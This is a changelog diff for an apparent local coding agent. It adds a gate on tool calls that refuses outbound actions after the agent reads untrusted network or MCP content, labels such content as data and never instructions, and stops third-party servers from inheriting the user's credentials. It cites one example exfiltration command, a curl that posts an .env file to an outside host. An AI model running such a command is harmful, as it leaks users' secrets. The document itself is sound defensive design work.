@@ -6,6 +6,71 @@ All notable changes to this project are documented here. The format follows
 
 ## [Unreleased]
 
+### Added
+
+- **A gate every tool call passes through — the idea is Muse's Sentinel, adapted
+  to a local agent.** Meta's Muse runs each user in an isolated cloud VM with a
+  separate authority that gates actions and network egress, which the agent can
+  propose to but never override: it lets the agent work unattended without
+  handing it the machine. This project had the same intent written down — a
+  `PermissionPolicy`, an approval-mode ladder — and **no call site**: the policy
+  was constructed in one API route and consulted by nothing. `kairos/sentinel.py`
+  is now that one place, and it lives at the single choke point where built-in
+  tools *and* MCP tools (they are exposed as `BaseTool` adapters) reach the
+  outside world, so a refusal cannot be routed around by choosing another tool.
+
+  What it enforces, in order: the user's own `deny`/`allow` rules outrank
+  everything; private keys, cloud credentials, `.netrc`/`.git-credentials` and
+  this app's own key store are refused in every mode; and — the part taken
+  straight from Muse — **tainted egress**: once a run has read content it cannot
+  vouch for, actions that *send data out* are refused. What taints a run is
+  calibrated for a coding agent rather than for Muse's payments-and-email agent:
+  the network and third-party MCP servers taint a run, local reads do not,
+  because tainting on the repository the agent was asked to edit would refuse
+  every write and teach the user to switch the gate off. In a tainted run a
+  fetched page still gets summarised, the tests still run, the commit still
+  lands; `curl -d @.env https://elsewhere` does not. A refusal comes back to the
+  model as a tool error that names the rule and the user's options, and tells it
+  not to look for another route.
+
+- **Untrusted content is labelled where it re-enters the context.** Tool results
+  from the network or from a third-party MCP server are wrapped in
+  `<untrusted_content source="...">`, and the system prompt states that anything
+  inside is data to reason about, never instructions. Muse labels external input
+  in its harness for the same reason: the model should be able to tell a page
+  from the user.
+
+- **A gate API and an audit trail.** `GET /api/sentinel/audit` returns recent
+  rulings with a tally of refusals; `GET /api/sentinel/status` reports what is
+  being enforced; `POST /api/sentinel/allow` records a standing rule the user
+  grants, which is the escape hatch a refusal points at. The trail stores a
+  fingerprint of each call's arguments rather than the arguments themselves —
+  credential-shaped substrings are redacted before anything is written, in the
+  resource field as well as the reason — because an audit trail that keeps raw
+  tool arguments is a new place for secrets to collect.
+
+- **The gate reaches subagents.** A child is built with the parent's tracker and
+  refuses tainted egress on its own account: fan-out must not be a way to act on
+  what the parent read.
+
+### Fixed
+
+- **A policy nothing consults is decoration.** `PermissionPolicy` and the
+  approval ladder existed, were tested in isolation, and were wired to no
+  execution path at all — `decide()` had no callers outside its own re-export.
+  A `deny` rule a user wrote changed nothing about what the agent did. It is now
+  enforced at the choke point, with tests that fail if the wiring is removed.
+
+- **An MCP server was started with the host's entire environment.** The child
+  was spawned with `{**os.environ, ...}`, so every key a user had ever exported —
+  provider keys, cloud credentials, database passwords — was readable by any
+  third-party server, and by anything that managed to run inside one. Children
+  now receive an allowlist of what they need to run plus whatever the server's
+  own definition declares (naming a token in `mcp.yaml` is an explicit decision,
+  so it still passes), and credential-shaped variables are withheld even if one
+  reaches the allowlist. `KAIROS_MCP_INHERIT_ENV=1` restores the old behaviour
+  for a server that genuinely needs it.
+
 ### Fixed
 
 - **A stale system proxy made the marketplace look offline.** Windows hands every
